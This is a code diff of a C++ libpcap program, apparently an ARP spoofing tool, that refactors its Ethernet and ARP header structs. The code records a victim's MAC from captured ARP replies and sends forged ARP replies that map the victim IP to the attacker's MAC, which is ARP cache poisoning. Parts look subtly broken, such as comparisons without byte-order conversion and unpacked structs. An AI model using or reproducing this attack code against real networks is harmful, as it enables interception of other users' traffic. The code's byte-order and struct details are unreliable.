@@ -7,16 +7,25 @@
 #include <stdlib.h>
 
 using namespace std;
-#define	ETHERTYPE_ARP		0x0806		/* Address resolution */
-#define	ARPOP_REQUEST	1		/* ARP request.  */
-#define	ARPOP_REPLY	2		/* ARP reply.  */
 
-struct ether_arp_hdr {
+static const int ETHERTYPE_ARP = 0x0806;
+static const int ARPOP_REQUEST = 1;
+static const int ARPOP_REPLY = 2;
 
+/*
+static is better than #define
+#define	ETHERTYPE_ARP	0x0806
+#define	ARPOP_REQUEST	1
+#define	ARPOP_REPLY	2
+*/
+
+struct ether_hdr {
     uint8_t h_dest[6];	/* destination eth addr	*/
     uint8_t h_source[6];	/* source ether addr	*/
     uint16_t h_proto;              /* packet type ID field	*/
+};
 
+struct arp_hdr {
     uint16_t ar_hrd;      	/* Format of hardware address.  */
     uint16_t ar_pro;      	/* Format of protocol address.  */
     uint8_t ar_hln;               /* Length of hardware address.  */
@@ -26,6 +35,11 @@ struct ether_arp_hdr {
     uint8_t __ar_sip[4];          /* Sender IP address.  */
     uint8_t __ar_tha[6];	/* Target hardware address.  */
     uint8_t __ar_tip[4];          /* Target IP address.  */
+};
+
+struct hdr_tosend {
+    ether_hdr eth;
+    arp_hdr arph;
 };
 
 void usage() {
@@ -64,7 +78,7 @@ int get_myinterface(char *dev, char my_mac[6]) {
 
     cout << "\nMy mac address : ";
     for(int j=0; j<6; j++) {
-        cout << dec << (int)my_mac[j] << " ";
+        cout << hex << (int)my_mac[j] << " ";
     };
 
     return 0;
@@ -72,22 +86,22 @@ int get_myinterface(char *dev, char my_mac[6]) {
 
 int send_arp_requestpacket(pcap_t* handle, char mac[6], char sip[4], char tip[4]) {
 
-    struct ether_arp_hdr *etharph = (struct ether_arp_hdr*)malloc(sizeof(struct ether_arp_hdr));
+    struct hdr_tosend *etharph = (struct hdr_tosend*)malloc(sizeof(struct hdr_tosend));
 
-    memset(etharph->h_dest, 0xff, 6);
-    memcpy(etharph->h_source, mac, 6);
-    etharph->h_proto = htons(ETHERTYPE_ARP);
+    memset(etharph->eth.h_dest, 0xff, 6);
+    memcpy(etharph->eth.h_source, mac, 6);
+    etharph->eth.h_proto = htons(ETHERTYPE_ARP);
 
-    etharph->ar_hrd = htons(0x0001);
-    etharph->ar_pro = htons(0x0800);
-    etharph->ar_hln = 0x06;
-    etharph->ar_pln = 0x04;
-    etharph->ar_op = htons(0x0001);
+    etharph->arph.ar_hrd = htons(0x0001);
+    etharph->arph.ar_pro = htons(0x0800);
+    etharph->arph.ar_hln = 0x06;
+    etharph->arph.ar_pln = 0x04;
+    etharph->arph.ar_op = htons(0x0001);
 
-    memcpy(etharph->__ar_sha, mac, 6);
-    memcpy(etharph->__ar_sip, sip, 4);
-    memset(etharph->__ar_tha, 0x00, 6);
-    memcpy(etharph->__ar_tip, tip, 4);
+    memcpy(etharph->arph.__ar_sha, mac, 6);
+    memcpy(etharph->arph.__ar_sip, sip, 4);
+    memset(etharph->arph.__ar_tha, 0x00, 6);
+    memcpy(etharph->arph.__ar_tip, tip, 4);
 
     if (pcap_sendpacket(handle, (const u_char*)etharph, 42) != 0) {
            fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(handle));
@@ -116,7 +130,7 @@ int main(int argc, char *argv[])
     int onetime = 0;
     const u_char* packet;
     struct pcap_pkthdr* header;
-    struct ether_arp_hdr *etharph;
+    struct hdr_tosend *etharph;
 
     pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
     if (handle == NULL) {
@@ -136,32 +150,32 @@ int main(int argc, char *argv[])
         if (res == 0) continue;
         if (res == -1 || res == -2) break;
 
-        etharph = (ether_arp_hdr*)packet;
+        etharph = (hdr_tosend*)packet;
 
-        if(etharph->h_proto == ETHERTYPE_ARP
-                && etharph->ar_op == ARPOP_REPLY) {
+        if(etharph->eth.h_proto == ETHERTYPE_ARP
+                && etharph->arph.ar_op == ARPOP_REPLY) {
 
             if(onetime == 0) { // Get victim mac
-                memcpy(victim_mac, etharph->h_source, 6);
+                memcpy(victim_mac, etharph->eth.h_source, 6);
                 onetime = 1;
             }
 
             // Sender : My mac address
-            memcpy(etharph->__ar_sha, mac, 6);
-            memcpy(etharph->h_source, mac, 6);
-            memcpy(etharph->__ar_sip, victimip, 4);
+            memcpy(etharph->arph.__ar_sha, mac, 6);
+            memcpy(etharph->eth.h_source, mac, 6);
+            memcpy(etharph->arph.__ar_sip, victimip, 4);
 
             // Target
-            memcpy(etharph->h_dest, victim_mac, 6);
-            memcpy(etharph->__ar_tha, victim_mac, 6);
-            memcpy(etharph->__ar_tip, targetip, 4);
+            memcpy(etharph->eth.h_dest, victim_mac, 6);
+            memcpy(etharph->arph.__ar_tha, victim_mac, 6);
+            memcpy(etharph->arph.__ar_tip, targetip, 4);
 
-            etharph->h_proto = htons(ETHERTYPE_ARP);
-            etharph->ar_hrd = htons(0x0001);
-            etharph->ar_pro = htons(0x0800);
-            etharph->ar_hln = 0x06;
-            etharph->ar_pln = 0x04;
-            etharph->ar_op = htons(0x0002);
+            etharph->eth.h_proto = htons(ETHERTYPE_ARP);
+            etharph->arph.ar_hrd = htons(0x0001);
+            etharph->arph.ar_pro = htons(0x0800);
+            etharph->arph.ar_hln = 0x06;
+            etharph->arph.ar_pln = 0x04;
+            etharph->arph.ar_op = htons(0x0002);
 
             if (pcap_sendpacket(handle, (const u_char*)etharph, 42) != 0) {
                    fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(handle));
